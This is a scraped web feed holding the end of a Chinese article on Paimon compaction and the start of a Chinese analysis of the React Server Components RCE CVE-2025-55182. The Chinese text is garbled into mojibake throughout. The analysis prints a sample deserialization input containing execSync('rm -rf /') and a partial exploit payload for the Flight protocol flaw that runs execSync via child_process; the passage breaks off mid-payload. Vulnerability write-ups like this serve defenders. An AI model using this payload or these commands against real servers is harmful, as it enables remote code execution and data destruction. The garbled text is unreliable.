    <span class="hljs-comment">// 6.è°ƒCompactManagerå®ç°ç±»çš„triggerCompaction()å»è§¦å‘æ–°å‹ç¼©ï¼Œæºå¸¦æ˜¯å¦å…¨é‡å‹ç¼©å‚æ•°</span>
    compactManager.triggerCompaction(forcedFullCompaction);
}
</code></pre>
<h2 data-id="heading-12">äºŒ.æ€»ç»“</h2>
<h3 data-id="heading-13">(1) write-only = true</h3>
<p>ç”¨<code>NoopCompactManager()</code>ï¼Œä¸æ‰§è¡Œä»»ä½•å‹ç¼©æ“ä½œï¼Œè€Œæ˜¯ç”±åç»­ä¸“ç”¨å‹ç¼©ä»»åŠ¡å»æ‰§è¡Œç›¸åº”çš„å‹ç¼©æ“ä½œ</p>
<h3 data-id="heading-14">(2) write-only = false</h3>
<p>write-only = falseï¼Œèµ°è‡ªåŠ¨å‹ç¼©ï¼Œç”¨<code>MergeTreeCompactManager</code></p>
<ol>
<li><strong>ä¼˜å…ˆä½¿ç”¨ <code>full-compaction.delta-commits</code> å‚æ•°ï¼Œå…¶æ¬¡ä½¿ç”¨ <code>compaction.optimization-interval</code> å‚æ•°</strong></li>
</ol>
<blockquote>
<p>deltaCommitså‚æ•°å–å€¼</p>
<ul>
<li>ç­‰äºfull-compaction.delta-commits</li>
<li>ç­‰äº(compaction.optimization-interval / cpé—´éš”)å–æ•´</li>
</ul>
</blockquote>
<ol start="2">
<li>å…ˆåˆ¤æ–­æ˜¯å¦é…ç½®äº†<code>changelog-producer = full-compaction</code> æˆ– é…ç½®äº†ä»»æ„ä¸Šé¢ä¸¤ä¸ªå‚æ•°ï¼Œèµ°<code>GlobalFullCompactionSinkWrite</code></li>
<li>åœ¨åˆ¤æ–­æ˜¯å¦é…ç½®äº†<code>force-lookup = true ä¸” lookup-wait = false</code>æ‰èµ°å¼‚æ­¥<code>AsyncLookupSinkWrite</code></li>
</ol>
<p>æœ€åå…œåº•<code>StoreSinkWriteImpl</code></p>
<p>ä»¥<code>GlobalFullCompactionSinkWrite</code>ä¸ºä¾‹</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant GFC as GlobalFullCompactionSinkWrite
    participant TW as TableWriteImpl
    participant AFW as AbstractFileStoreWrite
    participant MTW as MergeTreeWriter
    participant CM as MergeTreeCompactManager
    participant Executor as CompactExecutor

    GFC-&gt;&gt;TW: compact(partition, bucket, true)
    TW-&gt;&gt;AFW: write.compact(partition, bucket, true)
    AFW-&gt;&gt;AFW: getWriterWrapper(partition, bucket)
    AFW-&gt;&gt;MTW: writer.compact(true)
    
    MTW-&gt;&gt;MTW: flushWriteBuffer(true, true)
    
    Note over MTW: 1. åˆ·å†™WriteBufferåˆ°æ–‡ä»¶
    MTW-&gt;&gt;MTW: writeBuffer.forEach() -&gt; å†™å…¥Level 0æ–‡ä»¶
    MTW-&gt;&gt;CM: addNewFile(dataMeta)
    
    Note over MTW: 2. ç­‰å¾…ä¹‹å‰çš„å‹ç¼©å®Œæˆ
    MTW-&gt;&gt;CM: trySyncLatestCompaction(true)
    
    Note over MTW: 3. è§¦å‘å…¨é‡å‹ç¼©
    MTW-&gt;&gt;CM: triggerCompaction(true)
    
    CM-&gt;&gt;CM: pickFullCompaction() - é€‰æ‹©æ‰€æœ‰æ–‡ä»¶
    CM-&gt;&gt;Executor: submit(MergeTreeCompactTask)
    Executor--&gt;&gt;CM: taskFuture
    
    Note over Executor: å¼‚æ­¥æ‰§è¡Œå‹ç¼©ä»»åŠ¡&lt;br/&gt;è¯»å–æ‰€æœ‰æ–‡ä»¶ -&gt; Merge -&gt; å†™å…¥æ–°æ–‡ä»¶
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥è§£æ React å²ä¸Šæœ€ä¸¥é‡çš„ RCE æ¼æ´ CVE-2025-55182]]></title>    <link>https://juejin.cn/post/7582814236583362598</link>    <guid>https://juejin.cn/post/7582814236583362598</guid>    <pubDate>2025-12-12T16:23:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582814236583362598" data-draft-id="7582809606067306522" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥è§£æ React å²ä¸Šæœ€ä¸¥é‡çš„ RCE æ¼æ´ CVE-2025-55182"/> <meta itemprop="keywords" content="å‰ç«¯,React.js,å®‰å…¨"/> <meta itemprop="datePublished" content="2025-12-12T16:23:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Cr4zy_Uru5"/> <meta itemprop="url" content="https://juejin.cn/user/3438928100072813"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥è§£æ React å²ä¸Šæœ€ä¸¥é‡çš„ RCE æ¼æ´ CVE-2025-55182
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3438928100072813/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Cr4zy_Uru5
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T16:23:05.000Z" title="Fri Dec 12 2025 16:23:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 å¹´ 12 æœˆ 3 æ—¥ï¼ŒReact å®˜æ–¹è”åˆ Vercel å‘å¸ƒç´§æ€¥å®‰å…¨å…¬å‘Šï¼ŒæŠ«éœ² React Server Componentsï¼ˆRSCï¼‰å­˜åœ¨è‡´å‘½è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2025-55182ï¼‰ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ <strong>10.0</strong>ï¼ˆæœ€é«˜é£é™©ç­‰çº§ï¼‰ã€‚è¯¥æ¼æ´å¯é€šè¿‡æ„é€ æ¶æ„è¡¨å•è¯·æ±‚ï¼Œåœ¨æœªæˆæƒæƒ…å†µä¸‹æ‰§è¡ŒæœåŠ¡å™¨ä»»æ„ä»£ç ï¼Œå½±å“æ•°ç™¾ä¸‡åŸºäº React RSC å’Œ Next.js çš„åº”ç”¨ã€‚</p>
<p>è¿™ä¸ªæ¼æ´æ³¢åŠæ‰€æœ‰ä½¿ç”¨äº†å—å½±å“ç‰ˆæœ¬ React Server Components çš„åº”ç”¨ã€‚RSC ä½œä¸º React 18 çš„æ˜æ˜Ÿç‰¹æ€§ï¼Œä»¥å…¶ç‹¬ç‰¹çš„â€œæœåŠ¡å™¨ç›´å‡ºç»„ä»¶â€èƒ½åŠ›ï¼Œæ­£è¢«è¶Šæ¥è¶Šå¤šçš„æ¡†æ¶ï¼ˆå¦‚ Next.jsï¼‰æ‰€é›†æˆã€‚ç„¶è€Œï¼Œæ­£æ˜¯è¿™ä¸ªè¢«å¯„äºˆåšæœ›çš„ç‰¹æ€§ï¼Œå´æ‰“å¼€äº†æ½˜å¤šæ‹‰çš„é­”ç›’ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¸è´¹å¹ç°ä¹‹åŠ›ï¼Œåœ¨ä½ çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä½ çš„æœåŠ¡å™¨åœ¨ä»–ä»¬é¢å‰å‡ ä¹æ˜¯â€œè£¸å¥”â€çŠ¶æ€ã€‚å½“ç„¶ï¼Œå¦‚æœä½ åªæ˜¯ä½¿ç”¨ React åœ¨å®¢æˆ·ç«¯æ¸²æŸ“ï¼Œæ˜¯ä¸å—è¯¥æ¼æ´å½±å“çš„ã€‚</p>
<p>æœ¬æ–‡å°†è¯¦ç»†è§£æè¿™ä¸€ä¸¥é‡æ¼æ´ï¼Œæ­å¼€ CVE-2025-55182ï¼ˆåˆç§° React2Shellï¼‰çš„ç¥ç§˜é¢çº±ã€‚ä¸»è¦åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
<li><strong>ç†è§£æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šä»€ä¹ˆæ˜¯ RSCï¼Ÿä»€ä¹ˆæ˜¯ååºåˆ—åŒ–æ¼æ´ï¼Ÿ</li>
<li><strong>æ·±å…¥æ”»å‡»åŸç†</strong>ï¼šæ”»å‡»è€…æ˜¯å¦‚ä½•æ„é€ æ¶æ„â€œæ•°æ®åŒ…â€çš„ï¼Ÿ</li>
<li><strong>æºç çº§å‰–æ</strong>ï¼š<code>react-server-dom</code> çš„ä»£ç é‡Œåˆ°åº•è—ç€ä»€ä¹ˆâ€œåé—¨â€ï¼Ÿ</li>
<li><strong>å­¦ä¹ ä¸åæ€</strong>ï¼šæˆ‘ä»¬èƒ½ä»è¿™æ¬¡äº‹ä»¶ä¸­å­¦åˆ°ä»€ä¹ˆï¼Ÿ</li>
</ul>
<h2 data-id="heading-0">ä¸€ã€ç†è§£æ¼æ´çš„å¿…å¤‡çŸ¥è¯†</h2>
<p>åœ¨è§£ææ¼æ´ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆç†è§£ä¸‰ä¸ªå…³é”®æ¦‚å¿µï¼šRSCã€Flight åè®®å’Œååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h3 data-id="heading-1">1. React Server Componentsï¼šå‰ç«¯å¼€å‘çš„â€œæ–°ç§‘æŠ€â€</h3>
<p>ä½ å¯ä»¥æŠŠ RSC æƒ³è±¡æˆä¸€ç§â€œæ··è¡€â€ç»„ä»¶ã€‚å®ƒåœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œå¯ä»¥ç›´æ¥è¯»æ•°æ®åº“ã€è®¿é—®æ–‡ä»¶ï¼Œå°±åƒåç«¯ä»£ç ä¸€æ ·ï¼›ä½†å®ƒçš„äº§ç‰©åˆä¸æ˜¯å†·å†°å†°çš„ HTMLï¼Œè€Œæ˜¯ä¸€ç§èƒ½è¢«å®¢æˆ·ç«¯ React â€œå¬æ‡‚â€çš„ç‰¹æ®ŠæŒ‡ä»¤ã€‚</p>
<p><strong>å’Œä¼ ç»ŸæœåŠ¡ç«¯æ¸²æŸ“ (SSR) æœ‰ä»€ä¹ˆä¸ä¸€æ ·ï¼Ÿ</strong></p>
<p>å…ˆçœ‹ä¸¤è€…çš„åŠ è½½æµç¨‹å›¾ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    subgraph "ä¼ ç»Ÿ SSR (Server-Side Rendering)"
        A[æµè§ˆå™¨è¯·æ±‚é¡µé¢] --&gt; B(æœåŠ¡å™¨);
        B --&gt; C[React ç»„ä»¶æ¸²æŸ“æˆ HTML å­—ç¬¦ä¸²];
        C --&gt; D[è¿”å›å®Œæ•´ HTML];
        D --&gt; E(å®¢æˆ·ç«¯);
        E --&gt; F[åŠ è½½ JS è¿›è¡Œ Hydration];
    end

    subgraph "RSC (React Server Components)"
        G[æµè§ˆå™¨è¯·æ±‚æˆ–è§¦å‘ UI æ›´æ–°] --&gt; H(æœåŠ¡å™¨);
        H --&gt; I[æœåŠ¡å™¨ç»„ä»¶æ‰§è¡Œå¹¶åºåˆ—åŒ–ä¸º Flight æ•°æ®æµ];
        I --&gt; J[è¿”å› Flight æ•°æ®æµ];
        J --&gt; K(å®¢æˆ·ç«¯ React);
        K --&gt; L[è§£ææ•°æ®æµå¹¶æ— ç¼æ›´æ–° UI];
    end
</code></pre>
<p>ç®€å•æ¥è¯´ï¼š</p>
<ul>
<li><strong>SSR</strong> è¿”å›çš„æ˜¯â€œæ­»â€çš„ HTMLï¼Œå®¢æˆ·ç«¯éœ€è¦åŠ è½½ JavaScript æ‰èƒ½è®©é¡µé¢â€œæ´»â€è¿‡æ¥ï¼ˆè¿™ä¸ªè¿‡ç¨‹å«<strong>æ°´åˆ</strong>ï¼ŒHydrationï¼‰ã€‚</li>
<li><strong>RSC</strong> è¿”å›çš„æ˜¯â€œæ´»â€çš„æŒ‡ä»¤ï¼Œå®¢æˆ·ç«¯ React ç›´æ¥æ‰§è¡Œè¿™äº›æŒ‡ä»¤æ¥æ›´æ–° UIï¼Œæ•´ä¸ªè¿‡ç¨‹æ›´ä¸æ»‘ï¼Œè€Œä¸”æœåŠ¡å™¨ç»„ä»¶çš„ä»£ç å®Œå…¨ä¸å½±å“å®¢æˆ·ç«¯çš„åŒ…ä½“ç§¯ã€‚</li>
</ul>
<h3 data-id="heading-2">2. "Flight" åè®®ï¼šRSC çš„ä¸“å±â€œèˆªç­â€</h3>
<p>RSC çš„æŒ‡ä»¤æ˜¯å¦‚ä½•ä»æœåŠ¡å™¨é£åˆ°å®¢æˆ·ç«¯çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æ­ä¹˜â€œFlightâ€è¿™è¶Ÿä¸“å±èˆªç­ã€‚</p>
<p>Flight åè®®å°±æ˜¯ React å®šä¹‰çš„ä¸€å¥—æ•°æ®ä¼ è¾“æ ¼å¼ï¼Œä¸“é—¨ç”¨æ¥æ‰“åŒ…å’Œè¿è¾“ RSC çš„æ¸²æŸ“ç»“æœã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client as å®¢æˆ·ç«¯ (React App)
    participant Server as æœåŠ¡å™¨ (Node.js)

    Client-&gt;&gt;Server: å‘èµ· Flight è¯·æ±‚ (éœ€è¦ UserProfile ç»„ä»¶)
    Server-&gt;&gt;Server: æ‰§è¡Œ  UserProfile  æœåŠ¡å™¨ç»„ä»¶
    Server-&gt;&gt;Server: å°†ç»„ä»¶è¾“å‡ºåºåˆ—åŒ–ä¸º Flight æ•°æ®æ ¼å¼
    Server--&gt;&gt;Client: æµå¼è¿”å› Flight æ•°æ®
    Client-&gt;&gt;Client: æ¥æ”¶å¹¶è§£æ Flight æ•°æ®
    Client-&gt;&gt;Client: å°†æ–° UI æ›´æ–°åˆ° DOM ä¸­
</code></pre>
<h3 data-id="heading-3">3. ååºåˆ—åŒ–æ¼æ´ï¼šè¿‡äºä¿¡ä»»</h3>
<p>è¿™æ˜¯æˆ‘ä»¬ç†è§£æœ¬æ¬¡æ¼æ´çš„æ ¸å¿ƒ</p>
<ul>
<li><strong>åºåˆ—åŒ–</strong>ï¼šæŠŠç¨‹åºä¸­çš„æ•°æ®ï¼ˆæ¯”å¦‚ä¸€ä¸ªå¯¹è±¡ï¼‰å˜æˆä¸€ä¸²æ–‡æœ¬ï¼ˆæ¯”å¦‚ JSON å­—ç¬¦ä¸²ï¼‰ï¼Œæ–¹ä¾¿å­˜å‚¨æˆ–ä¼ è¾“</li>
<li><strong>ååºåˆ—åŒ–</strong>ï¼šæŠŠé‚£ä¸²æ–‡æœ¬å†å˜å›ç¨‹åºé‡Œçš„æ•°æ®ï¼ˆæ¯”å¦‚å°† JSON è½¬æ¢ä¸ºå¯¹è±¡ï¼‰</li>
</ul>
<p><strong>æ¼æ´å‡ºåœ¨å“ªï¼Ÿ</strong></p>
<p>å‡ºåœ¨è§£ææ—¶å­˜åœ¨ä¸å®‰å…¨çš„æ–‡æœ¬ã€‚å¦‚æœæœåŠ¡å™¨åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå®Œå…¨ä¿¡ä»»æ”¶åˆ°çš„æ•°æ®ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åœ¨æ–‡æœ¬é‡Œè—ä¸€é¢—â€œç‚¸å¼¹â€ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    subgraph "æ­£å¸¸æµç¨‹"
        A["å¯¹è±¡ï¼š{user: 'React'}"] -- åºåˆ—åŒ– --&gt; B["JSONï¼š{&amp;quot;user&amp;quot;:&amp;quot;React&amp;quot;}"];
        B -- ç½‘ç»œä¼ è¾“ --&gt; C(æ¥æ”¶ç«¯);
        C -- ååºåˆ—åŒ– --&gt; D["è¿˜åŸå¯¹è±¡ï¼š{user: 'React'}"];
    end

    subgraph "æ”»å‡»åœºæ™¯"
        E["æ¶æ„å¯¹è±¡"] -- åºåˆ—åŒ– --&gt; F["æ¶æ„ JSONï¼š{&amp;quot;user&amp;quot;:&amp;quot;hacker&amp;quot;,callback:&amp;quot;æ¶æ„ä»£ç &amp;quot;}"];
        F -- ç½‘ç»œä¼ è¾“ --&gt; G(æ¥æ”¶ç«¯);
        G -- ä¸å®‰å…¨çš„ååºåˆ—åŒ– --&gt; H["æ‰§è¡Œæ¶æ„ callback"];
        H -- RCE --&gt; I[æœåŠ¡å™¨è¢«æ§åˆ¶];
    end
</code></pre>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä¸€ä¸ªåº”ç”¨åœ¨ååºåˆ—åŒ–ç”¨æˆ·è®¾ç½®æ—¶ï¼Œå¦‚æœæ”»å‡»è€…èƒ½æ§åˆ¶ JSONï¼Œå¹¶ä¼ å…¥è¿™æ ·çš„å†…å®¹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"attacker"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"on_load"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"function() { require('child_process').execSync('rm -rf /'); }"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¦‚æœæœåŠ¡å™¨å‚»å‚»åœ°æŠŠ <code>on_load</code> çš„å€¼å½“ä½œå‡½æ•°æ¥æ‰§è¡Œï¼Œé‚£åæœä¸å ªè®¾æƒ³ã€‚</p>
<p><strong>React2Shell æ¼æ´ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ <code>react-server-dom</code> åœ¨å¤„ç† Flight â€œèˆªç­â€é€æ¥çš„â€œåŒ…è£¹â€æ—¶ï¼Œå‘ç”Ÿäº†æå…¶å±é™©çš„ä¸å®‰å…¨ååºåˆ—åŒ–ã€‚</strong></p>
<p>ç°åœ¨ï¼ŒåŸºç¡€çŸ¥è¯†å·²ç»é“ºå«å®Œæ¯•ã€‚ä¸‹ä¸€ç« ï¼Œæˆ‘ä»¬å°†æ­£å¼è¿›å…¥æºç ï¼Œçœ‹çœ‹æ”»å‡»è€…æ˜¯å¦‚ä½•ä¸€æ­¥æ­¥åˆ©ç”¨è¿™ä¸ªç¼ºé™·ï¼Œæœ€ç»ˆå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰çš„ã€‚</p>
<h2 data-id="heading-4">äºŒã€æ·±å…¥æºç ï¼šRCE çš„ä¸‰æ­¥å¿…æ€æŠ€</h2>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä¸€æ­¥æ­¥è¿˜åŸæ”»å‡»è€…æ˜¯å¦‚ä½•åˆ©ç”¨ <code>react-server-dom</code> çš„è®¾è®¡ç¼ºé™·ï¼Œå®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰è¿™è‡´å‘½ä¸€å‡»çš„ã€‚</p>
<p>æ•´ä¸ªæ”»å‡»è¿‡ç¨‹ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºâ€œä¸‰æ­¥å¿…æ€â€ï¼š</p>
<ol>
<li><strong>ç¬¬ä¸€æ­¥ï¼šç©ºæŠ•â€œç‰¹æ´›ä¼Šæœ¨é©¬â€</strong> â€”â€” æ„é€ ä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„æ¶æ„ Flight æ•°æ®åŒ…</li>
<li><strong>ç¬¬äºŒæ­¥ï¼šå·å–â€œä¸‡èƒ½é’¥åŒ™â€</strong> â€”â€” ä» JavaScript çš„åŸå‹é“¾ä¸­â€œå·â€å‡º <code>Function</code> æ„é€ å‡½æ•°è¿™ä¸ªå±é™©çš„å·¥å…·</li>
<li><strong>ç¬¬ä¸‰æ­¥ï¼šå¼•çˆ†â€œé€»è¾‘ç‚¸å¼¹â€</strong> â€”â€” è¯±å¯¼ React çš„è§£æå™¨æ‰§è¡Œä¸€ä¸ªçœ‹ä¼¼æ— å®³ã€å®åˆ™è‡´å‘½çš„æ“ä½œï¼Œå¼•çˆ†ç‚¸å¼¹</li>
</ol>
<p>è®©æˆ‘ä»¬é€ä¸€åˆ†è§£ã€‚</p>
<h3 data-id="heading-5">1. ç©ºæŠ•â€œç‰¹æ´›ä¼Šæœ¨é©¬â€ï¼ˆæ¶æ„ Payloadï¼‰</h3>
<p>æ”»å‡»çš„èµ·ç‚¹ï¼Œæ˜¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªç‰¹åˆ¶çš„ HTTP POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚çš„ body éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ª <code>multipart/form-data</code> æ ¼å¼çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„ Flight â€œåŒ…è£¹â€ã€‚</p>
<p>è¿™ä¸ªâ€œåŒ…è£¹â€é‡Œè—ç€æ”»å‡»è€…çš„â€œç‰¹æ´›ä¼Šæœ¨é©¬â€ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€åŒ–çš„ Payloadï¼Œæˆ‘ä»¬ä¼šé€ä¸€æ‹†è§£ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªç®€åŒ–çš„ Payload</span>
<span class="hljs-keyword">const</span> payload = {
    <span class="hljs-comment">// å…¥å£ç‚¹ï¼Œå‘Šè¯‰è§£æå™¨ä»å¯¹è±¡ '1' å¼€å§‹å¤„ç†</span>
    <span class="hljs-string">'0'</span>: <span class="hljs-string">'$1'</span>,
    <span class="hljs-comment">// ä¼ªè£…æˆä¸€ä¸ª Promise çš„æ ¸å¿ƒå¯¹è±¡</span>
    <span class="hljs-string">'1'</span>: {
        <span class="hljs-comment">// ... (ä¸€äº›è¿·æƒ‘æ€§çš„å±æ€§)</span>
        <span class="hljs-string">'value'</span>: <span class="hljs-string">'{"then":"$3:map","0":{"then":"$B3"},"length":1}'</span>, <span class="hljs-comment">// è§¦å‘ Promise é“¾çš„æ ¸å¿ƒ</span>
        <span class="hljs-string">'_response'</span>: <span class="hljs-string">'$4'</span>, <span class="hljs-comment">// æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„â€œå“åº”â€å¯¹è±¡ï¼Œé‡Œé¢è—ç€â€œæ­¦å™¨â€</span>
        <span class="hljs-string">'then'</span>: <span class="hljs-string">'$2:then'</span> <span class="hljs-comment">// è®©è‡ªå·±è¡¨ç°å¾—åƒä¸€ä¸ª Promise</span>
    },
    <span class="hljs-comment">// ä¸€ä¸ªçœŸæ­£çš„ Promiseï¼Œç”¨æ¥é©±åŠ¨æµç¨‹</span>
    <span class="hljs-string">'2'</span>: <span class="hljs-string">'$@3'</span>,
    <span class="hljs-comment">// ä¸€ä¸ªæ™®é€šçš„ç©ºæ•°ç»„ï¼Œä½†å®ƒçš„æ„é€ å‡½æ•°æ˜¯æˆ‘ä»¬çš„ç›®æ ‡</span>
    <span class="hljs-string">'3'</span>: [],
    <span class="hljs-comment">// ä¼ªé€ çš„â€œResponseâ€å¯¹è±¡ï¼Œæºå¸¦äº†æˆ‘ä»¬çš„â€œæ­¦å™¨â€å’Œâ€œå¼¹è¯â€</span>
    <span class="hljs-string">'4'</span>: {
        <span class="hljs-comment">// â€œå¼¹è¯â€ï¼šæƒ³è¦æ‰§è¡Œçš„æ¶æ„ä»£ç </span>
        <span class="hljs-string">'_prefix'</span>: <span class="hljs-string">'require("child_process").execSync("touch /tmp/pwned"); //'</span>,
